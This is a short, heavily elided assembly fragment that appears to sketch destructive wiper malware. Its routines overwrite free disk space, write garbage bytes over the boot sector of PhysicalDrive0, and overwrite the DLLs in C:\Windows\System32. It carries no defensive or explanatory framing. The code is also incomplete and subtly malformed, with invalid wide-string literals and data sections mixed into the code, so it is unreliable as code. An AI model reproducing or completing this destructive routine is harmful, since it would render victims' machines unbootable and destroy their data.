...
section .text
    ...
    overwrite_free_space:
        ...
        mov rdi, L"tempfile.tmp"        ; File name
    ...
    corrupt_boot_sector:
        ...
        mov rdi, L"\\\\.\\PhysicalDrive0" ; Boot drive
    ...
    section .data
    boot_sector_data db 0x00, 0xFF, 0xAA, 0x55, ... ; Boot sector garbage (512 bytes)
    ...
    overwrite_system_files:
        ...
        mov rdi, L"C:\\Windows\\System32\\*.dll" ; Target directory with critical DLLs
    ...
    section .data
    garbage_data db 0xDE, 0xAD, 0xBE, 0xEF, ... ; Garbage bytes to overwrite files
